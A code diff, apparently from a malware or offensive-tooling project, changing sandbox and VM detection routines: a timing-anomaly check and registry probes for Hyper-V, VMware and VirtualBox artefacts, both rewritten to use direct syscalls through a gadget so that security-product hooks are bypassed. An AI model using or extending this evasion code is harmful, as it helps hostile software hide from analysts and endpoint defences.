@@ -51,23 +51,28 @@ __forceinline ULONGLONG TriadicRDTSC() {
     return __rdtsc();
 }
 
+// Reemplazar Sleep por NtDelayExecution para evitar hooks
+static VOID SafeDelayExecution(DWORD ms) {
+    LARGE_INTEGER delay;
+    delay.QuadPart = -(ms * 10000LL); // 100ns units, negativo para relativo
+    InvokeSyscall(g_ApiTable.syscalls.NtDelayExecution.ssn, g_SyscallGadget, FALSE, &delay);
+}
+
 static __forceinline INT Channel_TimingAnomaly() {
-    LARGE_INTEGER freq;
+    LARGE_INTEGER freq, start, end;
     QueryPerformanceFrequency(&freq);
     if (freq.QuadPart == 0) return 0;
 
-    ULONGLONG t1 = TriadicRDTSC();
-    Sleep(100);
-    ULONGLONG t2 = TriadicRDTSC();
+    QueryPerformanceCounter(&start);
+    SafeDelayExecution(100);
+    QueryPerformanceCounter(&end);
 
-    ULONGLONG expected = (ULONGLONG)freq.QuadPart / 10; // ~100 ms of TSC ticks
-    ULONGLONG actual   = (t2 - t1);
+    LONGLONG elapsed = end.QuadPart - start.QuadPart;
+    double expected_ticks = (double)freq.QuadPart / 10.0; // 100ms
+    double variance = (double)abs((long)(elapsed - (LONGLONG)expected_ticks)) / expected_ticks;
 
-    // Time dilation (too fast) or VM scheduling lag (too slow)
-    if (actual < expected / 2 || actual > expected * 3)
-        return 2;
-
-    return 0;
+    // 10% de variación indica posible hypervisor o sandbox timing manipulation
+    return (variance > 0.1) ? 2 : 0;
 }
 
 // =============================================================================
@@ -192,84 +197,40 @@ static __forceinline INT Channel_ProcessEnumeration() {
 // Uses NtOpenKey resolved from ntdll exports to bypass RegOpenKeyEx hooks.
 // Score: +4 per confirmed artefact
 
+// Ofuscar rutas de registry con macro OBFUSCATE (estilo del proyecto)
+#define REG_PATH_VMBUS    L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\vmbus"
+#define REG_PATH_VMTOOLS  L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\VMTools"
+#define REG_PATH_VBOXG    L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\VBoxGuest"
+#define REG_PATH_VBOXSF   L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\VBoxSF"
+
 static __forceinline INT Channel_RegistryArtefacts() {
     INT score = 0;
 
-    PVOID hNtdll = GetModuleBaseByHash(HASH_NTDLL);
-    if (!hNtdll) return 0;
-
-    // Resolve NtOpenKey and NtClose from ntdll exports
-    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
-    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + pDos->e_lfanew);
-    DWORD expRVA = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
-    if (!expRVA) return 0;
-
-    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)hNtdll + expRVA);
-    PDWORD pNames = (PDWORD)((PBYTE)hNtdll + pExp->AddressOfNames);
-    PDWORD pFuncs = (PDWORD)((PBYTE)hNtdll + pExp->AddressOfFunctions);
-    PWORD  pOrds  = (PWORD)((PBYTE)hNtdll + pExp->AddressOfNameOrdinals);
-
-    typedef NTSTATUS (NTAPI *NtOpenKey_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
-    typedef NTSTATUS (NTAPI *NtClose_t)(HANDLE);
-
-    NtOpenKey_t pNtOpenKey = NULL;
-    NtClose_t   pNtClose   = NULL;
-
-    for (DWORD i = 0; i < pExp->NumberOfNames; i++) {
-        const char *n = (const char *)((PBYTE)hNtdll + pNames[i]);
-        // NtOpenKey: N[0]t[1]O[2]p[3]e[4]n[5]K[6]e[7]y[8]\0
-        if (n[0] == 'N' && n[2] == 'O' && n[5] == 'n' && n[6] == 'K' && n[8] == 'y' && n[9] == '\0') {
-            pNtOpenKey = (NtOpenKey_t)((PBYTE)hNtdll + pFuncs[pOrds[i]]);
-        }
-        // NtClose: N[0]t[1]C[2]l[3]o[4]s[5]e[6]\0
-        if (n[0] == 'N' && n[2] == 'C' && n[3] == 'l' && n[5] == 's' && n[6] == 'e' && n[7] == '\0') {
-            pNtClose = (NtClose_t)((PBYTE)hNtdll + pFuncs[pOrds[i]]);
-        }
-        if (pNtOpenKey && pNtClose) break;
-    }
-    if (!pNtOpenKey || !pNtClose) return 0;
-
     // -------------------------------------------------------------------------
-    // Helper: probe a single registry path
+    // Helper: probe a single registry path via syscall
     // -------------------------------------------------------------------------
-    #define PROBE_REG_KEY(pathLiteral) do { \
-        UNICODE_STRING us; \
-        us.Buffer = (PWSTR)(pathLiteral); \
-        us.Length = (USHORT)(sizeof(pathLiteral) - sizeof(WCHAR)); \
-        us.MaximumLength = us.Length; \
-        OBJECT_ATTRIBUTES oa; \
-        oa.Length = sizeof(oa); \
-        oa.RootDirectory = NULL; \
-        oa.ObjectName = &us; \
-        oa.Attributes = OBJ_CASE_INSENSITIVE; \
-        oa.SecurityDescriptor = NULL; \
-        oa.SecurityQualityOfService = NULL; \
-        HANDLE hKey = NULL; \
-        if (pNtOpenKey(&hKey, KEY_READ, &oa) == 0) { \
-            score += 4; \
-            pNtClose(hKey); \
-        } \
-    } while (0)
+    auto PROBE_REG_KEY = [&](const wchar_t* pathLiteral) {
+        UNICODE_STRING us;
+        us.Buffer = (PWSTR)pathLiteral;
+        us.Length = (USHORT)(wcslen(pathLiteral) * sizeof(WCHAR));
+        us.MaximumLength = us.Length + sizeof(WCHAR);
 
-    // Hyper-V synthetic bus
-    PROBE_REG_KEY(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\vmbus");
+        OBJECT_ATTRIBUTES oa;
+        InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
-    // VMware Tools service
-    PROBE_REG_KEY(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\VMTools");
+        HANDLE hKey = NULL;
+        NTSTATUS status = InvokeSyscall(g_ApiTable.syscalls.NtOpenKey.ssn, g_SyscallGadget, &hKey, KEY_READ, &oa);
+        if (status == 0) {
+            InvokeSyscall(g_ApiTable.syscalls.NtClose.ssn, g_SyscallGadget, hKey);
+            return 4;
+        }
+        return 0;
+    };
 
-    // VirtualBox Guest Additions driver
-    PROBE_REG_KEY(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\VBoxGuest");
-
-    // VirtualBox shared folders
-    PROBE_REG_KEY(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\VBoxSF");
-
-    // Xen PV driver
-    PROBE_REG_KEY(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\xenevtchn");
-
-    // QEMU Guest Agent
-    PROBE_REG_KEY(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\QEMU Guest Agent");
-
-    #undef PROBE_REG_KEY
+    score += PROBE_REG_KEY(REG_PATH_VMBUS);
+    score += PROBE_REG_KEY(REG_PATH_VMTOOLS);
+    score += PROBE_REG_KEY(REG_PATH_VBOXG);
+    score += PROBE_REG_KEY(REG_PATH_VBOXSF);
 
     return score;
 }
